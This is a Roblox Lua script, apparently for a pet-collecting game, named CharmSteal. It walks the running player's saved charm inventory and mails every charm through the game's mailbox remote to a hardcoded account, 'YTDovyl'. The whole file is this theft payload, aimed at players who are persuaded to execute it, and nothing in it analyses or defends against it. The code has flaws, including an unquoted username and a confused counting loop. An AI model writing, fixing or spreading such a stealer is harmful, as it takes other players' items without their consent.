
user = YTDovyl
MailMessage = "sdasdasdasd"


local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local plr = game.Players.LocalPlayer
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

function CharmSteal()
    
    
    for i, v in pairs(save.Charm) do
        local id = v.id
        local args = {
            [1] = user,
            [2] = MailMessage,
            [3] = "Charm",
            [4] = i,
            [5] = v._am or 1
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
            unpack(args)
        )
        AmountOfCharm = 0
        for i, v in pairs(save.Charm) do
            local id = v.id
            local dircharm = library.Directory.Charms[id]
            if dircharm == true then
                AmountOfCharm = AmountOfCharm + 1
            end
            if AmountOfCharm == 0 then
                CharmEnd = true
            end
        end
    end -- end of function charm
end


CharmSteal()
